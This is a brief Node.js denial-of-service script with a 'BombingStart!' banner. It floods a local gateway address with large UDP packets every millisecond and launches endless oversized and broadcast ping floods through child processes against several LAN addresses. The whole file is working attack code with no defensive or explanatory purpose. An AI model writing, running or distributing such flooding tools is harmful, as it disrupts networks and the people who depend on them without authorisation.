import gradient from 'gradient-string'
import dgram from 'dgram';
import { exec } from 'child_process'
console.log(gradient(['red','magenta'])('      └──> 𝕏𝙳𝐚ɴ𝙕 Starting > BombingStart!'));

function start() {
  const client = dgram.createSocket('udp4');
  const PORT = 80;
  const HOST = '192.168.1.1';
  setInterval(() => {
    const message = Buffer.from('XnetFromJawa'.repeat(9999));
    client.send(message, PORT, HOST, (err) => {
    });
  },1);
} function arp(){
	setInterval(()=>{
		exec('ping -s 65506 192.168.1.250');
	},0);
} function cast(){
	setInterval(()=>{
	    exec('ping -b -s 1320 192.168.1.255');
	},0);
} function icmp(){
    setInterval(()=>{
        exec('ping -s 65506 192.168.1.1');
    },0);
} function go(){
	icmp();cast();start();arp();
} go();
